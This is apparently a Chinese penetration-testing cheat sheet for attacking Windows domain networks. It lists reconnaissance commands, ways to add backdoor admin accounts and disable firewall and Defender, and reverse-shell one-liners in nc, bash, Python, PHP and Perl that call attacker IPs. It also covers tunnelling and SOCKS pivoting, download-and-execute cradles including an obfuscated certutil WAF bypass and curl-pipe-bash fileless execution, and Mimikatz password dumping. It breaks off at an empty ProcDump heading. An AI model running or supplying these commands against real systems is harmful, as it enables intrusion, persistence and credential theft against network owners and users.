## 1、内网基础知识

### 0X1、常用命令附录表

| 命令                                                         | 说明                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| net dclist                                                   | 查看目标所在域的域控                                         |
| net view                                                     | 查看目标所在域的域内目标                                     |
| net user admin 123456 /add                                   | 添加账号为admin，密码为123456的账号                          |
| net localgroup administrators admin /add                     | 将admin添加到管理员组                                        |
| ipconfig /all                                                | 查看本机ip，所在域                                           |
| arp -a                                                       | 查看arp缓存                                                  |
| net start                                                    | 查看开启了哪些服务                                           |
| net share                                                    | 查看开启了哪些共享                                           |
| net share ipc$                                               | 开启ipc共享                                                  |
| net share c$                                                 | 开启c盘共享                                                  |
| net time /domain                                             | 查看时间服务器，判断主域，主域服务器都做时间服务器           |
| net user /domain                                             | 查看域用户                                                   |
| net use \\192.168.xx.xx\ipc$ "" /user:""                     | 与192.168.xx.xx建立空连接                                    |
| net config Workstation                                       | 查看计算机名、全名、用户名、系统版本、工作站、域、登录域     |
| net localgroup administrators                                | 查看本地管理员组（通常会有域用户）                           |
| net view /domain                                             | 查看有几个域                                                 |
| net user 用户名 /domain                                      | 获取指定域用户的信息                                         |
| net group /domain                                            | 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） |
| net group 组名 /domain                                       | 查看域中某工作组                                             |
| net group "domain admins" /domain                            | 查看域管理员的名字                                           |
| net group "domain computers" /domain                         | 查看域中的其他主机名                                         |
| net group "doamin controllers" /domain                       | 查看域控制器（可能有多台）                                   |
| REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f | 开启3389                                                     |
| netsh advfirewall set allprofiles state off net stop windefend | 关闭防火墙                                                   |
| net user guest /active:yes<br />net localgroup administrators guest /add<br />net user guest 1q2w3e4R!! | 激活guest用户并将其添加到超级管理员组，适用于在有防护情况下没有办法添加账户 |
| query user                                                   | 查看当前登录用户                                             |
| tracert IP                                                   | 路由跟踪                                                     |
| taskkill /im 12555 /f                                        | 关闭PID为12555的进程                                         |
| wmic process where<br/>processid=4444 get processid,executablepath,name | 读取进程为4444的程序路径                                     |
| wmic logicaldisk get caption,name                            | 查看盘符                                                     |
| wmic OS get Caption,CSDVersion,OSArchitecture,Version        | 查看版本                                                     |
| wmic product get name,version                                | 查看软件                                                     |
| netsh firewall show config                                   | 查看防火墙信息                                               |

### 1.1、工作组

​	将不同的计算机按功能(或者部门)分别列入不同的工作组以实现对网络的管理不至于混乱。

### 1.2、域（Domain）

​	域（Domain）：域是一个有安全边界的计算机集合（安全边界的意思是在两个域中，一个域的用户无法访问另一个域中的资源）。

#### 1.2.1、域控制器（Domain Controller，DC）

​	域控制器（Domain Controller，DC）是域中的一台类似管理服务器的计算机，域控制器负责所有连入计算机和用户的验证工作，域控制器是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行。

#### 1.2.2、单域

​	通常在一个地理位置固定的小公司里，建立一个域就可以满足需求。在一个域中，一般要有至少两台域服务器，一台作为DC(父域)，另一台作为备份DC(辅域)。

#### 1.2.3、父域和子域

​	出于管理及其他需求。需要在网络中划分多个域。第一个域称为父域，各分部的域称为该域的子域。

#### 1.2.4、域树

​	域树（Tree）是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域，不能访问或者管理其他域。

#### 1.2.5、域森林

​	域森林（Forest）是指多个域树通过建立信任关系组成的集合。

#### 1.2.6、域名服务器

​	域名服务器（Domain Name Server，DNS）是指用于实现域名和与之相对应的IP地址转换的服务器，在内网渗透中，大都是通过寻找DNS服务器来确定域控制器的位置的（DNS服务器和域控制器通常配置在同一台机器上）。

### 1.3、 活动目录

​	活动目录（Active Directory，AD）是域环境中提供目录服务的组件。如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。AD库存放了网络中的众多对象的信息。将AD数据库安装在一台计算机上，这时这台计算机即为DC（域控制器）。

### 1.4、DMZ

​	DMZ称为”隔离区“，也称”非军事化区“。为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。DMZ区通常位内部网络和外部网络之间的小网络区域内，DMZ区中通常部署一些公开的服务，如企业Web、FTP服务器等。

## 2、内网环境信息收集

### 2.1、查询网络配置信息

```html
ipconfig /all
```

![image-20210204010859915](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204010859915.png)



### 2.2、查询进程列表

```html
tasklist /svc
wmic process list brief
```

![image-20210204011506066](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204011506066.png)



### 2.3、查看启动程序信息

```html
wmic startup get command,caption
```

![image-20210204011634695](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204011634695.png)



### 2.4、查看计划任务

```html
schtasks /query /fo list /v
```

![image-20210204011806094](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204011806094.png)



### 2.5、查看主机开机时间

```html
net statistics workstation
```

![image-20210204011920563](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204011920563.png)

### 2.6、查询用户列表

```html
net user
```

![image-20210204012036012](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204012036012.png)



使用以下命令获取本地管理员(通常包含域用户)信息:

```html
net localgroup administrators
```

![image-20210204012205872](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204012205872.png)

查看当前在线用户

```html
query user || qwinsta
```

![image-20210204012344194](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204012344194.png)

### 2.7、查询端口

```html
netstat -ano
```

<img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204012608584.png" alt="image-20210204012608584" style="zoom: 67%;" />

### 2.8、查询补丁列表

```html
systeminfo
```

### 2.9、查询本机共享列表

```html
net share
```

### 2.10、查询路由表

```html
route print
arp -a
```

### 2.11、查询防火墙相关配置

#### 2.11.1、关闭防火墙

（1）、windows server 2003 及之前的版本，命令如下：

```html
netsh firewall set opmode disable
```

（2）、windows server 2003之后的版本，命令如下：

```html
netsh advfirewall set allprofiles state off
```

#### 2.11.2、查看防火墙配置

```html
netsh firewall show config
```

#### 2.11.3、修改防火墙配置

（1）、windows server 2003及之前的版本，允许指定程序全部连接，命令如下：

```html
netsh firewall add allowedprogram c:\nc.exe "allow nc" enable
```

（2）、windows server 2003之后的版本，命令如下：

```html
netsh advfirewall firewall add rule name=”My Application” dir=in action=allow program=”c:\nc.exe” enable=yes
```

（3）、允许3389端口放行：

```html
netsh advfirewall firewall add rule name=”remote desktop” protocol=TCP dir=in localport=3389 action=allow
```

### 2.12、查询并开启远程连接服务

（1）、在windows server 2003中开启3389端口

```html
wmic path win32_terminalservicesetting where (_class !="") call setallowtsconnections 1
```

（2）、在windows server 2008 和windows server 2012中开启 3389端口

```html
1、wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (_CLASS !="") call setallowtscoonections 1

2、wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1

3、red add "HKLM\SYSTEMCURRENT\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /f 0 /f
```



### 2.13、查询当前权限

#### 2.13.1、查看当前权限

```html
whoami
```

#### 2.13.2、获取域SID

```html
whoami /all
```

#### 2.13.3、查询指定用户的详细信息

```html
net user XXX /domain
```

### 2.14、判断是否存在域

（1）、使用ipconfig命令，获取DNS域名后，再使用反向解析查询命令nslookup来解析域名的ip地址，用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否再同一台服务器上

```html
ipconfig /all 【假设获取的dns服务器域名为"hacker.lad"】
nsllokup hacker.lad
```

（2）、查看系统详细信息，“域”即域名，“登录服务器”为域控制器，如果“域”为“workgroup”。表示当前服务器不在域内。

```html
systeminfo
```

（3）、查询当前登录域及登录用户信息

"工作站域DNS名称"为域名（如果为“WORKGROUP”，表示当前为非域环境），“登录域”用于表示当前登录的用户是域用户还是本地用户，此处表示当前登录的用户是本地用户。

```html
net config workstation
```

![image-20210204022857006](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210204022857006.png)

（4）、判断主域

域服务器通常会同时作为时间服务器使用，我们可以使用以下命令来判断主域

```html
net time /domain
```

执行以上命令，通常会有以下三种情况：

- 存在域，但当前用户不是域用户；

- 存在域，且当前用户是域用户；
- 当前网络环境为工作组，不存在域。

## 3、端口扫描

### 3.1、Nmap探测存活

```html
nmap -sP --min-hostgroup 1024 --min-parallelism 1024 -iL ip.txt -oG ip_output1113.txt
```

### 3.2、Ladon探测存活

```html
https://github.com/k8gege/Ladon
```

### 3.3、Windows下主机扫描存活

```html
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
```

### 3.4、Linux下扫描主机存活

```html
for k in $( seq 1 255);do ping -c 1 192.168.99.$k|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
```

## 4、收集域内基础信息

​	如果确定当前内网拥有域，且所控制的主机在域内，就可以进行域内相关信息的收集了，以下使用到的查询命令在本质上都是通过LDAP协议到域控制器上进行查询的，所以在查询时会进行权限认证，只有域用户才拥有此权限，本地用户无法运行以下介绍到的查询命令。

### 4.1、查询域

```html
net view /domain
```

### 4.2、查询域内所有计算机

```html
net view /domain:HACK (假设查询得到的主机名为HACK)
```

### 4.3、查询域内所有用户组列表

```html
net group /domain
```

常见的用户身份如下：

- Domain Admins: 域管理员
- Domain Computers: 域内机器
- Domain controllers: 域控制器
- Domain Guest: 域访客，权限较低
- Domain Users:域用户
- Enterprise Admins: 企业系统管理员用户

默认情况下，Domain Admins和Enterprise Admins对域内所有域控制器有完全控制权限。

### 4.4、查询所有域成员计算机列表

```html
net group "domain computers" /domain
```

### 4.5、获取域密码信息

执行以下命令，获取域密码策略、密码长度、错误锁定等信息

```html
net accounts /domain
```

### 4.6、获取域信任信息

nltest只在win2003以上有自带

```html
nltest /domain_trusts
nltest /domain_trusts /all_trusts /v /server:域控地址  【获取域控所信任的域】
nltest /dsgetdc:HACK /server:域控地址  【获取域HACK的详细信息】

```

### 4.7、csvde的使用

​	csvde是windows server 2008的内置命令行工具，位于%windir%/system32文件夹中。如果安装了AD DS 或Active Directory轻型目录服务(AD LDS)服务器角色，则此功能可用。

​	适用于： windows server 2003、windows server 2008、windows server 2003 R2、windows server 2008 R2、windows server 2012、windows8的windows server 2003

```html
csvde -setspn hack -f c:\windows\tmp\hack.csv 【hack为域控】  
```

参考：https://www.cnblogs.com/micr067/p/11923383.html

### 4.8、setspn的使用

```html
setspn -T hack -Q */* 【hack为域控】
```

SPN官方名称即"服务主体名称"，本质上存的就是域内各种服务资源的对应关系，如对应的服务类型是什么，机器名是多少，服务端口是多少，借助SPN我们可以快速定位当前目标域中所有存活的各类服务器。

![image-20210610010009319](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210610010009319.png)



### 4.9、dnsdump的使用

```html
dnsdump.exe -u 域名\域用户 -p 域密码 域控机器名
```

使用该工具我们可以很快获得域控下活动的ip。



## 5、查找域控制器

### 5.1、查看域控制器的主机名

```html
nslookup -type=SRV _ldap._tcp
```

### 5.2、查看域控制器的机器名

```html
nltest /DCLIST:hacke
```

### 5.3、查看当前时间

在通常情况下，时间服务器为主域控制器

```html
net time /domain
```

### 5.4、查看域控制组

```html
net group "Domain Controllers" /domain
```

在实际网络中，一个域内一般存在两台或两台以上的域控制器，其目的是：一旦主域控制器发生故障，备用的域控制器可以保证域内的服务和验证工作正常进行。

## 6、获取域内的用户和管理员信息

### 6.1、查询所有域用户列表

#### 6.1.1、向域控制器进行查询

```html
net user /domain
```

#### 6.1.2、获取域内用户的详细信息

执行如下命令，可以获取域内用户的详细信息，比如用户名、描述信息、SID、域名、状态等。

```html
wmic useraccount get /all
```

#### 6.1.3、查看存在的用户

```html
dsquery user
```

#### 6.1.4、查询本地管理员组用户

```html
net localgroup administrators
```

### 6.2、查询域管理员用户组

#### 6.2.1、查询域管理员用户

```html
net group "domain admins" /domain
```

#### 6.2.2、查询管理员用户组

```html
net group "Enterprise Admins" /domain
```

## 7、隐藏通信隧道基本知识

### 7.1、概述

网络层：IPv6隧道、ICMP隧道、GRE隧道

传输层：TCP隧道、UDP隧道、常规端口转发

应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道

### 7.2、判断内网的连通性

#### 7.2.1、ICMP协议

执行命令“ping <ip地址或域名>”

```html
ping baidu.com
```

#### 7.2.2、TCP协议

使用nc工具，执行“nc <ip地址 端口号>”

```html
nc -zv 192.168.1.2 80
```

#### 7.2.3、HTTP协议

使用curl工具，执行“curl <IP地址 端口号>”

```html
curl www.baidu.com 80
```

#### 7.2.4、DNS协议

在进行DNS连通性检测时，常用的命令为nslookup和dig，命令分别如下：

```html
nslookup www.baidu.com vps-ip   #使用nslookup工具
dig @vps-ip www.baidu.com A 		#使用dig工具
```

### 7.3、lcx端口转发

#### 7.3.1、内网端口转发

​	在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网VPS的4444端口上。

```html
lcx.exe -slave <公网主机ip地址> 4444 127.0.0.1 3389
```

​	在VPS上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555端口上。

```html
lcx.exe -listen 4444 5555
```

此时，用mstsc登录“<公网主机ip地址>:5555”,或者在VPS上用mstsc登录主机127.0.0.1的5555端口，即可访问目标服务器的3389端口。

#### 7.3.2、本地端口映射

​	如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应端口的数据传到防火墙允许的其他端口(例如53)。在目标主机上执行如下命令，就可以直接从远程桌面连接到目标主机的53端口。

```html
lcx -tran 53 <目标主机IP地址> 3389
```

### 7.4、netcat的使用

1、端口监听

```sh
nc -l -p 9999
```

2、文件传输

在本地VPS主机中输入如下命令，开始监听，一旦连接建立，数据便会流入

```sh
nc -lp 333 > 1.txt
```

在目标主机中输入如下命令，与VPS的333端口建立连接，并传输一个名为test.txt的文本文件

```sh
nc -vn 192.168.1.4 333 < test.txt -q 1
```

3、简易聊天

在本地VPS上输入如下命令

```sh
nc -l -p 888
```

在目标主机上输入如下命令

```sh
nc -vn 192.168.1.4 888
```

具体的用法可以参考https://blog.csdn.net/cunjiu9486/article/details/109074000

### 7.5、shell的用法和介绍

shell分为两种，一种是正向shell，另一种是反向shell。如果客户端连接服务器，客户端想要获取服务器的shell，就称为正向shell；如果客户端连接服务器，服务器想要获取客户端得到shell，就称为反向shell。反向shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。

#### 7.5.1、nc反弹shell

（1）、正向shell

输入以下命令，监听目标主机的4444端口：

```sh
nc -lvp 4444
```

输入如下命令，在本地或者vps主机上连接目标主机的4444端口

```sh
nc 192.168.1.11 4444 -e /bin/sh			#Linux
nc 192.168.1.11 4444 -e C:\Windows\System32\cmd.exe		#Windows
```

（2）、反向shell

输入如下命令，在本地或者VPS主机上监听本地9999端口

```sh
nc -lvp 9999
```

在目标主机中输入如下命令，连接VPS主机的9999端口

```sh
nc 139.9.33.11 9999 -e /bin/sh			#Linux
nc 139.9.33.11 9999 -e C:\Windows\System32\cmd.exe		#Windows
```



#### 7.5.2、反弹shell总结

##### 1、python反向shell

执行如下命令，在VPS上监听本地2222端口

```html
nc -lvp 2222
```

在目标主机上执行命令

```html
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.242.48.224",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

##### 2、Bash反向shell

执行如下命令，在VPS上监听本地4444端口

```bash
nc -lvp 4444
```

在目标主机上执行如下命令

```bash
bash -i >& /dev/tcp/139.9.168.107/4444 0>&1
```



##### 3、PHP反向shell

执行如下命令，在VPS上监听本地4444端口

```bash
nc -lvp 4444
```

执行如下命令实现PHP环境下的反弹shell

```php
php -r '$sock=fsockopen("VPS的地址",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```



##### 4、Perl反向shell

执行如下命令，在VPS上监听本地4444端口

```bash
nc -lvp 4444
```

如果此时目标主机使用的是Perl，仍然可以使用Perl来建立反向shell，在目标主机上执行如下命令

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

不依赖/bin/bash

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

在window上运行

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 7.6、应用层隧道技术

#### 7.6.1、SSH协议

创建SSH隧道的常用参数说明如下

- -C：压缩传输，提高传输速度。
- -f：将SSH传输转入后台执行，不占用当前的shell。
- -N：建立静默连接（建立了连接，但是看不到具体会话）。
- -g：允许远程主机连接本地用于转发的端口。
- -L：本地端口转发。
- -R：远程端口转发。
- -D：动态转发（SOCKS代理）。
- -P：执行SSH端口。

##### 1、本地转发

​		环境说明：攻击者VPS【192.168.1.4】，攻击者VPS可以访问内网Web服务器【192.168.1.11、1.1.1.16】，但不能访问数据库服务器，内网Web服务器和数据库服务器【1.1.1.10】可以互相访问。测试目标为：以Web服务器为跳板。访问数据库服务器的3389端口。

​		以Web服务器192.168.1.11为跳板，将内网数据库服务器1.1.1.10的3389端口映射到VPS机器192.168.1.4的1153端口，再访问VPS的1153端口，就可以访问1.1.1.10的3389端口了。

```bash
ssh -CFNg -L 1153(vps端口)：1.1.1.10(目标主机):3389(目标端口) root@192.168.1.11(跳板机)
```

​	再连接本地1153端口即可访问数据库服务器的3389端口了

```bash
rdesktop 127.0.0.1:1153
```



##### 2、远程转发

​		环境说明：攻击者VPS【192.168.1.4】，攻击者VPS不能访问内网中的三台服务器；内网Web服务器【1.1.1.200】可以访问外网VPS，数据库服务器（1.1.1.10）和域控制器（1.1.1.2）均不能访问外网VPS，测试目标为：通过外网VPS访问数据库服务器的3389端口。

​		以Web服务器为跳板，将VPS的3307端口的流量转发到1.1.1.10的3389端口，然后访问VPS的3307端口，就可以访问1.1.1.10的3389端口了。

​		在Web服务器1.1.1.200上执行如下命令：

```bash
ssh -CfNg -R 3307(vps端口):1.1.1.10(目标主机):3389(目标端口) root@192.168.1.4
```

​		在本地访问VPS的3307端口，可以发现已经和数据库服务器1.1.1.10的3389端口建立了连接：

```bash
rdesktop 127.0.0.1:3307
```



##### 3、动态转发

​		在VPS上执行如下命令，建立一个动态的SOCKS 4/5代理通道，输入Web服务器【192.168.1.11】的密码：

```bash
ssh -Cfng -D 7000 root@@1922.168.1.11
```

​		然后在本地打开浏览器，设置网络代理【127.0.0.1:7000】，通过浏览器访问内网域控制器1.1.1.2，动态端口映射就是建立一个SSH加密的SOCKS 4/5代理通道。任何支持SOCKS 4/5协议的程序都可以使用这个加密通道进行代理访问。

​	

#### 7.6.2、HTTP/HTTPS协议

HTTP Service代理用于将所有的流量转发到内网，常见的代理工具如下：

```html
https://github.com/sensepost/reGeorg
https://github.com/L-codes/Neo-reGeorg
```



#### 7.6.3、DNS协议

​		在网络世界中，DNS是一个必不可少的服务；另一个方面，DNS报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件。而在网络安全攻防演练中，DNS隧道的应用场景如下：在安全策略严格的内网环境中，常见的C&C通信端口会被众多安全设备所监控，Red Team对目标内网的终端进行渗透测试，发现该网段只允许白名单流量出站，同时其他端口都被屏蔽，传统的C&c通信无法建立，在这样的情况下，Red Team可以使用DNS隐蔽隧道建立通信。

​	常见的DNS隐蔽隧道建立工具有dnscat2【https://github.com/iagox86/dnscat2】和iodine【https://github.com/yarrick/iodine】。

​	参考资料

```html
https://xz.aliyun.com/t/2214
https://blog.csdn.net/localhost01/article/details/86591685
https://blog.csdn.net/tan6600/article/details/52142254
http://www.91ri.org/16386.html
```



### 7.7、socks代理

#### 7.7.1、EarthWorm的应用

##### 1、正向SOCK5服务器

以下命令适用于目标机器拥有一个外网IP地址的情况：

```bash
ew -s ssocksd -l 888
```

执行以上命令，即可架设一个端口为888的SOCKS代理。接下来使用Proxifier或者SockCap64添加这个IP地址的代理即可。



##### 2、反弹SOCK5服务器

目标机器没有公网IP且需要访问内网资源的情况下可以使用该命令，首先，在你的VPS中执行以下命令：

```bash
ew -s rcsocks -l 1008 -e 888
```

该命令的意思是在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发给888端口。

然后在目标机器上执行如下命令：

```bash
./ew -s rssocks -d 8.142.189.101 -e 80
```

现在访问公网VPS的1008端口就能访问内网资源了

##### 3、二级网络资源(a)

​		场景假设：假设已经获取A主机和B主机【10.48.128.49】的控制权限。A主机配有两块网卡，一块能够连接外网，另一块(10.48.128.25)只能连接内网的B主机，但无法访问内网中的其他资源。B主机可以访问内网资源，但无法访问外网。

​		首先，将EW上传到B主机中，利用ssocksd方式启动888端口的SOCKS代理，命令如下:

```bash
ew -s ssocksd -l 888
```

​		然后，将EW上传到A主机中，执行如下命令：

```bash
ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888
```

​		该命令的意思是将1080端口收到的代理请求转发给B主机【10.48.128.49】的888端口，现在就能通过访问A主机的外网1080端口使用在B主机上架设的SOCKS5代理了。

##### 4、二级网络环境(b)

​		场景假设：假设已经获取A主机和B主机【10.48.128.49】的控制权限，A主机既没有公网IP地址，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。

​		首先，将EW上传到公网VPS中，执行如下命令：

```bash
ew -s lcx_listen -l 10800 -e 888
```

​		该命令的意思是在公网VPS中添加转接隧道，将10800端口收到的代理请求转发到888端口。接着将EW上传到B主机【10.48.128.49】中，并利用ssocksd方式启动999端口的SOCKS代理了，命令如下：

```bash
ew -s ssocksd -l 999
```

​		然后将EW上传到A主机中，执行如下命令：

```bash
ew -s lcx_slave -d [VPS的地址] -e 888 -f 10.48.128.49 -g 999
```

​		最后通过访问公网VPS的10800端口使用在B主机上架设的SOCKS5代理了。

#### 7.1.2、IOX的应用

**转发**

监听0.0.0.0:8888和0.0.0.0:9999，将两个连接间的流量转发

```html
./iox fwd -l 8888 -l 9999
```

监听0.0.0.0:8888，把流量转发到1.1.1.1:9999

```
./iox fwd -l 8888 -r 1.1.1.1:9999
```

连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发

```
./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999
```

**代理**

在1.1.1.1上执行

```html
iox.exe proxy -l 9999 -l 1080
```

在目标机上执行

```html
iox.exe proxy -r 1.1.1.1:9999
```

出现以上提示即为转发成功

![image-20211209154624354](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20211209154624354.png)

#### 7.1.3、msf的应用

前期通过msf获取shell权限后，使用以下命令代建内网代理

```html
use auxiliary/server/socks_proxy
set srvhost 1.1.1.1
set srvport 1080
run
```

然后打开/etc/proxychains.conf，在文件中加上

```html
socks5 1.1.1.1 1080
```

### 7.8、上传和下载

#### 7.8.1、Windows

##### 1、通过certutil.exe下载文件

```bash
certutil.exe -urlcache -split -f http://47.242.48.224/2.exe
```

可通过以下变形绕过waf：

```html
"c""e""r""t""u""t""i""l" -"u""r""l""c""a""c""h""e" -split -f https://url/1.exe 1.exe
```

##### 2、通过vbs下载文件

​		往往在实战中，没有上传的方便条件，尤其是目标机是windows，只有echo方式来写入vbs。将以下代码保存为downfile.vbs

```vps
set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open "get",wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2
```

​		命令行下执行，即可远程下载rebots.txt文件并保存为b.txt。

```bash
cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt
```

​		在实际环境中，可以通过运行如下命令来写入vps

```bash
echo Set Post = CreateObject("Msxml2.XMLHTTP") >>hhh.vbs
echo Set Shell = CreateObject("Wscript.Shell") >>hhh.vbs
echo Post.Open "GET","http://47.242.48.224/1.exe",0 >>hhh.vbs
echo Post.Send() >>hhh.vbs
echo Set aGet = CreateObject("ADODB.Stream") >>hhh.vbs
echo aGet.Mode = 3 >>hhh.vbs
echo aGet.Type = 1 >>hhh.vbs
echo aGet.Open() >>hhh.vbs
echo aGet.Write(Post.responseBody) >>hhh.vbs
echo aGet.SaveToFile "2.exe",2 >>hhh.vbs
```



##### 3、通过FTP下载文件

```bash
echo open 192.168.1.115 21 > ftp.txt
echo 123 >> ftp.txt //user
echo 123 >> ftp.txt //password
echo binary >> ftp.txt //bin模式
echo get robots.txt >> ftp.txt
echo bye >> ftp.txt
```



##### 4、通过js下载文件

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);
```

保存为1.js，命令行下执行：

```bash
cscript /nologo 1.js http://192.168.1.115/robots.txt
```



##### 5、通过bitsadmin下载文件 

​		BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。运行如下命令下载文件：

```bash
E:\>bitsadmin /rawreturn /transfer down "http://192.168.1.115/robots.txt" E:\PDF\robots.txt
```

​		如果下载文件在1-5M之间，需要时时查看进度。同样它也支持进度条。

```bash
bitsadmin /transfer down /download /priority normal "http://192.168.1.115/robots.txt" E:\PDF\robots.txt
```

注意：bitsadmin不支持HTTPS和FTP协议，也不支持Windows XP/Sever 2003及以前的版本。



##### 6、通过powsershell下载文件

自Windows7以后内置了powershell，如Windows 7中内置了PowerShell2.0, Windows 8中内置了PowerShell3.0。

**PowerShell2.0**

```powershell
$Urls = @()
$Urls += "http://192.168.1.115/robots.txt"
$OutPath = "E:\PDF\" ForEach ( $item in $Urls)
{
	$file = $OutPath + ($item).split('/')[-1]
	(New-Object System.Net.WebClient).DownloadFile($item, $file)
}
```

命令行下运行：

```powershell
powershell -File down.ps1
```

**PowerShell3.0**

```powershell
$url = "http://192.168.1.115/robots.txt"
$output = "C:\inetpub\robots.txt"
$start_time = Get-Date
Invoke-WebRequest -Uri $url -OutFile $output
Write-Output "Time : $((Get-Date).Subtract($start_time).Seconds) second(s)"
```

命令行下运行：

```powershell
powershell  C:\inetpub\down1.ps1
```

**注：需要绝对路径**

你也可以使用一句话来下载文件：

```powershell
powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.1.115/robots.txt','E:\robots.txt')
```

##### 7、通过wmic下载文件

执行WMIC以下命令从远程服务器下载并运行恶意XSL文件：

```bash
wmic os get /FORMAT:"http://192.168.28.128/evil.xsl"
```

##### 8、通过mshta下载文件

mshta用于执行.hta文件

```bash
mshta http://192.168.28.128/run.hta
```

##### 9、通过pubprn.vbs下载文件

在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本，可以利用来解析.sct脚本：

```bash
"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

#### 7.8.2、Linux

##### 1、通过curl下载文件

可以用curl的方式执行http页面上的shell脚本，无需download，在本地机器上直接执行。

```bash
方式1：curl -fsSL http://192.168.99.19:8080/test.sh | bash
方式2：bash < <( curl http://192.168.99.19:8080/test.sh )
```

##### 2、通过wget下载文件

```bash
方式1：wget -q -O- http://192.168.99.19:8080/test.sh | bash
方式2：wget http://192.168.99.19:8080/shell.txt -O /tmp/x.php && php /tmp/x.php
```



##### 3、curl和wget合并，实现无文件远程恶意代码执行

```bash
bash -c '(curl -fsSL http://192.168.99.19:8080/test.sh||
wget -q -O- http://192.168.99.19:8080/test.sh)|bash -sh >/dev/null 2>&1&'
```



##### 4、通过rcp下载文件

```bash
rcp root@x.x.x.x:./testfile testfile
```



##### 5、通过scp下载文件

scp 是 rcp 的加强版，scp 是加密的，rcp 是不加密的。

```bash
scp username@servername:/path/filename /tmp/local_destination
```



##### 6、通过rsync下载文件

使用rsync可以进行远程同步，拉取文件到本地服务器。

```bash
rsync -av x.x.x.x:/tmp/passwd.txt /tmp/passwd.txt
```



## 8、登录凭证获取技巧

### 8.1、前言

​	在渗透测试中，当我们拿下一台windows主机后，通常要对主机上的一些密码做信息收集，以便后续渗透使用，本文介绍了几种windows下常见的收集密码的方式。

### 8.2、windows主机密码抓取

#### 8.2.1、Mimikatz

windows密码抓取神器，从windows系统进程lsass.exe中抓取明文密码。

- 下载地址：

```html
https://github.com/gentilkiwi/Mimikatz
```

- 使用说明：管理员权限运行`Mimikatz.exe`，执行下面的命令：

```html
privilege::debug   #提取权限
log #记录日志内容
sekurlsa::logonPasswords   #抓取密码

Mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
```



![image-20210530110209769](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530110209769.png)



#### 8.2.2、ProcDump + Mimikatz

